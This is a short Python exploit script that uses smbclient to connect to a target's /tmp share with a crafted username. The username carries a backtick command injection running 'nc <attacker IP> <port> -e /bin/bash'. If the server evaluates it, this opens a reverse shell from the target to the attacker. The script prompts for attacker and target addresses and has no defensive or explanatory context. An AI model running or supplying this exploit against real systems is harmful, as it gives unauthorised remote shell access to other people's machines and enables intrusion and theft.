import subprocess

attacker_ip = input("Your IP: ")
target_ip = input("Target IP: ")
listener_port = int(input("Listener port to be used: "))

user = f"'/=`nc {attacker_ip} {listener_port} -e /bin/bash'"

result = subprocess.run([
        "smbclient",
        f"//{target_ip}/tmp",
        "-U", user,
        "N"
], capture_output=True, text=True)


print(result)
